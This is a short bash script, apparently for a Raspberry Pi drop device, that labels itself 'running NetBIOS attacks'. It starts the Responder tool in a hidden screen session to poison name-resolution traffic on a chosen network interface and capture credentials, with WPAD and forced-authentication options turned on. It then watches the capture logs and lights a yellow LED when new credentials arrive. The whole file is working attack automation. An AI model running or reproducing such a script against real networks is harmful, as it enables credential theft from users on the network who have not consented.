#!/bin/bash

echo 'running NetBIOS attacks'
HOME='/home/pi/'

[[ $(pgrep responder) = '' ]] && {
	screen -dmS responder python3 $HOME/src/responder/Responder.py -I "$1" -r -d -w -F
}

inotifywait -e MODIFY -rm $HOME/src/responder/logs | while read event
do
 	if echo $event | grep -v Session.log > /dev/null; then
 		led yellow on 2> /dev/null
 	fi
done